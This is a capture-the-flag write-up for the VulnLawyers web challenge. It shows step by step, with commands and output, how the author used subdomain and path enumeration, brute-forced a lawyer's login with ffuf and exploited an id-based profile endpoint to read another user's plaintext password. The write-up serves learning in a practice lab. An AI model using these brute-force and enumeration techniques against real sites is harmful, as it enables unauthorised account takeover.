---
title: 'CTF Challenge VulnLawyers Writeup'
metaTitle: 'CTF Challenge VulnLawyers Writeup'
metaDesc: 'A writeup for the VulnLawyers challenge from ctfchallenge.com'
metaImg: 'https://ctfchallenge.com/images/ctflogo-trans.png'
date: '2022-09-14'
tags:
  - ctf
  - web
  - writeup
---

[[toc]]

## A Little Disclaimer

So you're looking for answers, are ya? Well, I've got them, but for a price...
Namely a little bit of your time and attention:

**Please try the challenges yourself before checking the answers.**

CTF's are notoriously 'NP' prone. Once you've seen the answer, it's easy
to think you could've come up with that. There is nothing wrong with looking up
answers, but try reflect on why you couldn't figure it out. I try to explain my
thought process as best and brief as possible, but figuring it out yourself is
just the best feeling, so please give it another go when you're reading this!
I'll not include any of the flags to avoid people simply copying and pasting
them.

Another note, I create these writeups as if speaking to myself. If my manner of
speaking seems a bit odd, you try talking to yourself without sounding
a little odd.

## Flags

### Data Baby (Enumeration)

The first flag can be found by performing a standard recon of the subdomains of
`vulnlawyers.co.uk`.
```
$ dnsrecon -d vulnlawyers.co.uk -D ~/path/to/wordlists/subdomains.txt -t brt

[*] Using the dictionary file: /home/zohar/Documents/Playground/wordlists/subdomains.txt (provided by user)
[*] brt: Performing host and subdomain brute force against vulnlawyers.co.uk...
[+] 	A data.vulnlawyers.co.uk 68.183.255.206
[+] 	A www.vulnlawyers.co.uk 68.183.255.206
[+] 2 Records Found
```

Doing a http request with `curl`, or opening the domain in your browser returns
some info about the API and the first flag.
```
$ curl http://data.vulnlawyers.co.uk -H "Cookie: <your_ctf_cookie>"

{"name":"VulnLawyers Website API","version":"2.1.04","flag":"[^FLAG^1337-DIY-1337^FLAG^]"}
```

### Browsers are Evil (Enumeration)

Now that we know the different domains that are available to us, let's do some
recon on the different files and folders we have access to.
```
$ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=<your_ctf_cookie>" -u http://www.vulnlawyers.co.uk/FUZZ


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

[...]
________________________________________________

css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]
denied                  [Status: 401, Size: 1020, Words: 178, Lines: 30, Duration: 15ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 14ms]
login                   [Status: 302, Size: 1119, Words: 197, Lines: 31, Duration: 16ms]
```

Since we are (always) looking to escalate privileges, the `login` endpoint looks
especially interesting. Entering `http://www.vulnlawyers.co.uk/login` in your
browser will lead to a page that says **Acess is denied from your IP address**.
Shit. But take a look at where we are `http://www.vulnlawyers.co.uk/denied`,
we've been rerouted. 

Let's take a look at what happens with our request in the browser by opening the
developer tab (often <kbd>F12</kbd>, but if you didn't know that, you might want
to look into some other challenges). Opening the 'Network' tab (on
Firefox, might be different on Chrome, Safari, etc.) shows that we got a `302`
code from the `/login` endpoint. This code specifically tells a *browser* to
reroute to a URL given by the `Location` header [^1].

Browsers can do weird stuff, so let's try to ask `curl` what's up.
```
$ curl www.vulnlawyers.co.uk/login -H "Cookie: ctfchallenge=<your_ctf_cookie>"

[...]
  <div class="alert alert-info">
      <p>Access to this portal can now be found here <a href=/lawyers-only">/lawyers-only</a></p>
      <p>[^FLAG^TRY_ME_B*TCH^FLAG^]</p>
  </div>
[...]
```
Well, would you look at that, a flag and a hidden endpoint :eyes:! Christmas
came early this year.

Opening the URL `http://www.vulnlawyers.co.uk/lawyers-only` will bring us to a
login screen. Now we can start gaining some unrequisited privileges.

### Pipelining (Enumeration)

The current goal is to log in, but we lack any user data. Thinking back, the
`data.vulnlawyers.co.uk` probably contains some of that precious user data.
Actually, we have yet to enumerate files and folders. Not you tho, no, while we
were trying to figure out how to access the login page, you have of course
started `ffuf`'ing (that's not a word, but it should be) the domain. If you
haven't, keep in mind that reconnaissance can sometimes take a long time.
Minimize waiting and keep that noggin of yours churning.

```
$ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=<your_ctf_cookie>" -u http://data.vulnlawyers.co.uk/FUZZ


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

[...]
________________________________________________
users                   [Status: 200, Size: 406, Words: 6, Lines: 1, Duration: 21ms]
```

'Lo and behold, an endpoint called `/users`. Let's employ `curl` and see what it
holds.
```
curl data.vulnlawyers.co.uk/users -H "Cooki e: ctfchallenge=<your_ctf_cookie>"
{
  "users": [
    {
      "name": "Yusef Mcclain",
      "email": "yusef.mcclain@vulnlawyers.co.uk"
    },
    {
      "name": "Shayne Cairns",
      "email": "shayne.cairns@vulnlawyers.co.uk"
    },
    {
      "name": "Eisa Evans",
      "email": "eisa.evans@vulnlawyers.co.uk"
    },
    {
      "name": "Jaskaran Lowe",
      "email": "jaskaran.lowe@vulnlawyers.co.uk"
    },
    {
      "name": "Marsha Blankenship",
      "email": "marsha.blankenship@vulnlawyers.co.uk"
    }
  ],
  "flag": "[^FLAG^https://media.giphy.com/media/26gs6vEzlpaxuYgso/giphy.gif^FLAG^]"
}
```

And that's our third flag. Onto exploitation!

### Higher and Higher (Exploitation)

With a bit of luck, the attorneys are not technically inclined and use simple
passwords. After a bit of trail-and-error, we stumble upon Jaskaran Lowe.

```
ffuf -w ~/Documents/Playground/wordlists/passwords.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=<your_ctf_cookie>" -u http://www.vulnlawyers.co.uk/lawyers-only-login -H "Content-Type: applicati
on/x-www-form-urlencoded" -d 'email=jaskaran.lowe@vulnlawyers.co.uk&password=FUZZ' -fr "Invalid"


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

[...]
________________________________________________

summer                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
```

Logging in using browser gives us some info regarding a case, but more
importantly, the next flag!

### Some More Digging (Exploitation)

We got a whole new section of the site to explore! Now, it might be worth doing
some more fuzzing on the path since we've actually been redirected to
`.../lawyers-only-login` from `.../lawyers-only`, and opening the **Profile
tab** shows the path `.../lawyers-only-profile`. Thus, we run `ffuf [...]
http://www.vulnlawyers.co.uk/lawyers-only-FUZZ` while further exploring the new
domain. Spoiler alert: no interesting results, but good habit nonetheless.

Looking at the **Portal** page shows a list of current cases. There is a single
case which is managed by *Shayne Cairns*, who is also the only one who can
perform actions on it. New goal: gain access to their account. Opening the
source code of the shows nothing interesting.

Taking a closer look at the **Profile** page shows us a place where we can
update our user data! Immediate thought: could we somehow use this to update
another user's profile info? Let's take a look at the request payload using the
**Network** tab in the dev tools.

```
name=Jaskaran+Lowe&email=jaskaran.lowe%40vulnlawyers.co.uk
```

Hmm, doesn't seem like it. This leads to finding more info in the request,
like a new cookie called `token`. Makes sense, these requests have to be
authenticated, we should include this in any requests we do via the terminal.
Otherwise, nothing seems unusual.

Perhaps we can find something interesting in the source code. Let's use `curl`
to retrieve the data.
```
$ curl curl http://www.vulnlawyers.co.uk/lawyers-only-profile -H "Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>"

<script>
    $.getJSON('/lawyers-only-profile-details/4',function(resp){
        $('input[name="email"]').val( resp.email );
        $('input[name="name"]').val( resp.name );
    });
</script>
```

Oh would you look at that :glasses:! That's how our info was already filled in!
For some reason they use some other source than the
`data.vulnlawyers.co.uk/users` endpoint which we've seen before. Maybe this
contains different information.
```
$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/4 -H "Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>"

{
  "id": 4,
  "name": "Jaskaran Lowe",
  "email": "jaskaran.lowe@vulnlawyers.co.uk",
  "password": "summer"
}
```

Oh yes. Plain old passwords. Of course, they should have used the
`data.vulnlawyers.co.uk/users` API endpoint to retrieve that data. Let's access
*Shayne Cairns* profile details with the user `id` which we can find at
`data.vulnlawyers.co.uk/users`. Small note: that id was zero-indexed (Jaskaran's
`id` here is `4` while it was `3` before), this one isn't. Compensating for that
gives the following request.
```
$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/2 -H "Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>"

{
  "id": 2,
  "name": "Shayne Cairns",
  "email": "shayne.cairns@vulnlawyers.co.uk",
  "password": "w&#2a1^3p",
  "flag": "[^FLAG^NA_AH^FLAG^]"
}
```
Flag number five!

### Finishing Up (Exploitation)

This leaves us to the last flag. We now use the found credentials to log in as
Shayne Cairns, delete the case, and find the last flag :celebration:.

[^1]: [302 Found](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302)
